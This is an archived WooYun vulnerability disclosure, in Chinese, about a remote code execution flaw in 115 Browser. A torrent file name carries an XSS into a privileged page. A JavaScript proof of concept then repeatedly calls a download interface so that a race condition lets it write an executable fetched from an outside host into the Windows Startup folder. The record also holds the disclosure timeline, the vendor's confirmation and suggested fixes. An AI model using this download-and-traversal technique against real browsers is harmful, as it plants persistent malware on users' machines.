{"id": 79720, "wybug_id": "wooyun-2015-0157485", "wybug_title": "115浏览器漏洞之邪恶的种子（远程代码执行）", "wybug_corp": "115网盘", "wybug_author": "隐形人真忙", "wybug_date": "2015-12-01 23:48", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 115浏览器的猥琐命令执行，看到网盘里的种子你还敢下载吗？ 详细说明：  115浏览器更新啦！**.**.**.**版本，这个版本修补了之前提到的命令执行。\n\n对于window.browserInterface接口进行了限制，在普通域下无法进行调用，但是可以在chrome域下使用，并且修复了之前的目录跳转漏洞http://**.**.**.**/bugs/wooyun-2010-0149968。我们来进行一一突破。-------------------------------------------0x00 特权域XSS之邪恶的种子-------------------------------------------在排查特权域的途中，发现了一个有趣的功能：chrome://mini_download_frame提供种子文件的解析下载。\n\n当选择种子的时候，就能看到种子包含的各个文件信息。现在我们测试一下这里的文件名是否经过了有效的过滤，如果没有过滤，就能获得一个特权域的XSS：\n\n使用种子文件编辑器进行编辑，修改其中一个文件名为<script>标签，嵌入我们的恶意代码，test.js中是一句简单的alert(document.domain)，执行结果如下：\n\n有些文件名好污....洞主也是随便找的一个种子，大家可以忽略。-------------------------------------------0x01 猥琐的命令执行姿势-------------------------------------------有了特权域XSS，我们能做的事情就很多了，前面说到了browserInterface接口在chrome是没有限制的，但是新版本的115浏览器修复了之前的目录跳转，我们依靠下载函数window.browserInterface.BatchDownloadFilesToLocal结合新建目录的跳转受到了限制，具体如下：\n\n尝试使用URL中跳转符@进行绕过，但是同样失败了。似乎这种方法无法在被利用。但是我在测试的过程中发现了一些有趣的现象，当多次执行下载函数后，115浏览器背后的路径权限检查和下载动作存在竞争条件，具体来讲就是多次执行时，有些下载任务在已经下载了一定字节的数据后才开始进行保存路径权限的判断。在家庭4M网络下进行测试，发现多次执行的同一条下载函数甚至可以下载到300k的数据，并且可以执行目录跳转，这么大的数据可以达到放置一个小型的木马了。测试代码如下：\nfor(var i=0;i<20;i++){ window.browserInterface.BatchDownloadFilesToLocal([\"http://**.**.**.**/cmd.exe\"],[\"../../../Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.exe\"],\"test\") ; }\n上面的代码是执行下载任务20次，还是使用之前的目录跳转漏洞。可以看到，20次中，成功下载到了cmd.exe，原理就是115浏览器对于跳转目录的权限判断修补相对于下载动作来说有些滞后，导致了多次执行后，有些任务下载完成但是没有来得及进行路径权限判断，这样就导致了我们可以将exe下载到任意文件夹中，造成命令执行（下载到启动目录）。\n\n按照惯例，录个gif：http://**.**.**.**/115exp.gif有了上面特权XSS和跳转目录修复的突破，我们不难写出命令执行的POC，使用种子文件加载恶意的XSS代码，代码和上面相同，执行多次下载和目录跳转。效果见gif：http://**.**.**.**/115rce.gif这种类型的RCE是不是很猥琐？真实效果应该和用户的网速有关，洞主在4M家庭网络下进行测试，执行20次就可以成功。当网络环境差的时候，执行更多次也是能达到效果的。所以，在115网盘空间里看见了诱人的种子文件，你还敢点击下载吗？   漏洞证明：  1、多次执行突破路径权限限制http://**.**.**.**/115exp.gif2、综合利用命令执行http://**.**.**.**/115rce.gif   修复方案：  1、修复特权域XSS2、继续修复目录跳转的判断流程   版权声明：转载请注明来源 隐形人真忙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-02 09:35 厂商回复：  感谢隐形人真忙对115浏览器的支持，我们尽快修复漏洞！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-01 23:56 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1662 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  前排    \n     2015-12-02 00:50 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:738 漏洞数:93        | 没关系啊，我们还有音乐)\t\t \n  能远程种马儿不？    \n     2015-12-02 06:26 |    \t\tpaper \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 无)\t\t \n  围观大神    \n     2015-12-02 09:27 |    \t\t隐形人真忙 \t\t\t( 普通白帽子  |\t\t\t        Rank:145 漏洞数:18        | 关注安全研发与漏洞)\t\t \n  @数据流 可以    \n     2015-12-06 17:51 |    \t\t疯兔子 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  能说一下这些浏览器那些远程代码执行的具体意义么。。    \n     2015-12-06 23:47 |    \t\t隐形人真忙 \t\t\t( 普通白帽子  |\t\t\t        Rank:145 漏洞数:18        | 关注安全研发与漏洞)\t\t \n  @疯兔子 那你就多学习学习  然后就知道了    \n     2015-12-07 10:44 |    \t\tondrej \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | Android)\t\t \n  关注，等公开学习    \n     2015-12-08 13:14 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:35        | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~)\t\t \n  115我只存放“学习资料”    \n     2015-12-09 11:26 |    \t\tJeechan \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一个深沉又滑稽的人)\t\t \n  @Arthur 我只放实战技术    \n     2015-12-09 18:18 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  @Jeechan 那是3D虚拟现实    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}